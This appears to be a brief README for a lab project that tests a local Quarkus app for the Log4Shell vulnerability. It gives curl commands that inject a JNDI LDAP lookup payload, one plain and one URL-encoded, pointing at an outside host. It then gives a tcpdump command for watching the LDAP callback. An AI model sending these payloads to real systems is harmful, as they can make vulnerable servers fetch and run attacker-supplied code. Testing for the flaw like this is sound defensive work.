# log4shell-quarkus

```bash
# This won't work
curl http://localhost:8080/endpoint?var=${jndi:ldap://127.0.0.1/a}

# So, use this
curl http://localhost:8080/endpoint?var=%24%7Bjndi%3Aldap%3A%2F%2Fwww.wolf.com%2Fa%7D
```

```bash
# You can see the results using this command
sudo tcpdump -i en0 -nn port 389
```
